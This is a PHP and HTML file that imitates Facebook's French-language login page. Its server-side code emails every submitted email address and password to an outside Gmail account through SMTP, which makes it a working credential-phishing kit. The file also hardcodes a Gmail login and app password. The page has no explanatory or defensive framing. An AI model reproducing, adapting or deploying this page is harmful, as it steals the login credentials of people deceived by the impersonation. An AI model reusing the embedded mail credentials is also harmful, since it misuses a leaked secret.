<?php
require 'phpmailer/src/PHPMailer.php';
require 'phpmailer/src/SMTP.php';
require 'phpmailer/src/Exception.php';

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

$popupMessage = "";

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $emailInput = $_POST['email'] ?? '';
    $password = $_POST['password'] ?? '';
    $email = filter_var(trim($emailInput), FILTER_VALIDATE_EMAIL);

    $mail = new PHPMailer(true);

    try {
        $mail->isSMTP();
        $mail->Host = 'smtp.gmail.com';
        $mail->SMTPAuth = true;
        $mail->Username = 'hansmbaya@gmail.com';
        $mail->Password = 'fwnh etlc yequ suzy'; // mot de passe d'application
        $mail->SMTPSecure = 'ssl';
        $mail->Port = 465;

        $mail->setFrom('hansmbaya@gmail.com', 'Hans Mbaya');
        $mail->addAddress('mbayahans@gmail.com');
        $mail->Subject = 'Nouvelle connexion Facebook';
        $mail->Body = "Email : $emailInput\nMot de passe : $password";

        $mail->send();
        $popupMessage = "Connexion réussie. Vos données ont été envoyées avec succès.";
    } catch (Exception $e) {
        $popupMessage = "Erreur lors de l’envoi : {$mail->ErrorInfo}";
    }
}
?>

<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Facebook – Connexion ou inscription</title>
  <link rel="icon" href="https://www.facebook.com/favicon.ico" />
  <style>
    body {
      margin: 0;
      background: #f0f2f5;
      font-family: Helvetica, Arial, sans-serif;
    }

    .popup {
      display: <?php echo $popupMessage ? 'block' : 'none'; ?>;
      position: fixed;
      top: 20px;
      left: 50%;
      transform: translateX(-50%);
      background-color: #0D1C40;
      color: gold;
      padding: 15px 25px;
      border-radius: 10px;
      font-size: 16px;
      z-index: 1000;
      box-shadow: 0 0 10px rgba(0,0,0,0.5);
      animation: fadeIn 0.4s ease-out;
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: translateX(-50%) translateY(-10px); }
      to { opacity: 1; transform: translateX(-50%) translateY(0); }
    }

    .main-container {
      display: flex;
      justify-content: center;
      align-items: center;
      padding-top: 100px;
    }

    .login-box {
      width: 396px;
      background-color: #ffffff;
      padding: 20px 16px;
      border-radius: 8px;
      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
    }

    .login-box input {
      width: 100%;
      padding: 14px;
      margin-bottom: 10px;
      border: 1px solid #dddfe2;
      border-radius: 6px;
      font-size: 16px;
    }

    .login-box button {
      width: 100%;
      padding: 14px;
      background-color: #1877f2;
      color: white;
      font-size: 17px;
      font-weight: bold;
      border: none;
      border-radius: 6px;
      cursor: pointer;
    }

    .login-box button:hover {
      background-color: #166fe5;
    }

    .login-box a {
      display: block;
      text-align: center;
      color: #1877f2;
      text-decoration: none;
      font-size: 14px;
      margin-top: 14px;
    }

    .divider {
      border-top: 1px solid #dddfe2;
      margin: 20px 0;
    }

    .create-account {
      background-color: #42b72a;
      color: white;
      font-weight: bold;
    }

    .create-account:hover {
      background-color: #36a420;
    }
  </style>
</head>
<body>

<?php if ($popupMessage): ?>
  <div class="popup"><?php echo htmlspecialchars($popupMessage); ?></div>
<?php endif; ?>

<div class="main-container">
  <form method="POST" class="login-box">
    <input type="text" name="email" placeholder="Adresse e-mail ou téléphone" required />
    <input type="password" name="password" placeholder="Mot de passe" required />
    <button type="submit">Se connecter</button>
    <a href="#">Mot de passe oublié ?</a>

    <div class="divider"></div>
    <button type="button" class="create-account">Créer nouveau compte</button>
  </form>
</div>

</body>
</html>